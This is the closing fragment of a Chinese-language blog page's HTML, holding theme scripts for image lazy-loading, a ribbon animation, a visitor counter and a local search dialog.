src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><script src="/js/random_essay.js?1"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>